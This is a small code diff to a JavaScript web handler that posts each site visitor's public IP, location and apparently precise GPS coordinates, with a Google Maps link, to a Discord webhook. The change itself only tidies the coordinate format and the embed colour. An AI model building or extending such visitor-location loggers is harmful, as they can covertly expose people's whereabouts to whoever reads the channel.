@@ -38,7 +38,8 @@ export default async function handler(req, res) {
   const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
   
   if (webhookUrl) {
-    const mapsLink = logEntry.isPrecise ? `\n📍 [Voir sur Google Maps](https://www.google.com/maps/search/?api=1&query=${logEntry.coords})` : "";
+    const cleanCoords = logEntry.coords.replace(/\s/g, '');
+    const mapsLink = logEntry.isPrecise ? `\n📍 [Voir sur Google Maps](https://www.google.com/maps/search/?api=1&query=${cleanCoords})` : "";
     const locValue = logEntry.isPrecise ? `✅ **GPS PRÉCIS**\n${logEntry.location}\nCoords: ${logEntry.coords}${mapsLink}` : `❌ IP Uniquement\n${logEntry.location}\nCoords: ${logEntry.coords}`;
 
     try {
@@ -48,7 +49,7 @@ export default async function handler(req, res) {
         body: JSON.stringify({
           embeds: [{
             title: "🚀 Nouvelle Visite sur le Site !",
-            color: logEntry.isPrecise ? 0x00ff00 : 0xff9900,
+            color: logEntry.isPrecise ? 0x00FF00 : 0xFFA500, // Vert pur si précis, Orange sinon
             fields: [
               { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
               { name: "🌐 IP Publique (WiFi)", value: `\`${publicIp}\``, inline: true },
